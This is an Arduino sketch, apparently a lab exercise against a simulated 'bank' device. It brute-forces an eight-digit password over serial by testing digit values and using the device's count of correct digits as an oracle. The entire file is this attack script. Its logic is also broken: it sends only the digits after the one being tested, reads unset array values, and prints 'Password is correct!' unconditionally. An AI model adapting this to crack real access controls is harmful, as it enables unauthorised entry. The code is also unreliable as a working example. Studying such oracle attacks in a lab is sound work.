#include <Arduino.h>

const int numDigits = 8; // TODO: Change to 2 when running bank tests
const int numPossibleValues = 10;
const int bankDelay = 300; // TODO: Change to correct bank delay (number of milliseconds to pause)

void setup() {
  Serial.begin(9600);
}

void loop() {
  int password[numDigits];
  int correctDigits = 0;

  for (int i = 0; i < numDigits; i++) {
    for (int j = 0; j < numPossibleValues; j++) {
      password[i] = j;
      String passwordStr = "";
      for (int k = i + 1; k < numDigits; k++) {
        passwordStr += String(password[k]);
      }
      passwordStr += "\n";
      Serial.println(passwordStr); // TODO: maybe need to change how the bank is reading our input
      delay(bankDelay); // wait for the Bank to respond
      int response = Serial.parseInt();
      if (response > correctDigits) {
        correctDigits = response;
        break; // move on to the next digit
      }
    }
  }

  // password is correct!
  Serial.println("Password is correct!");
}
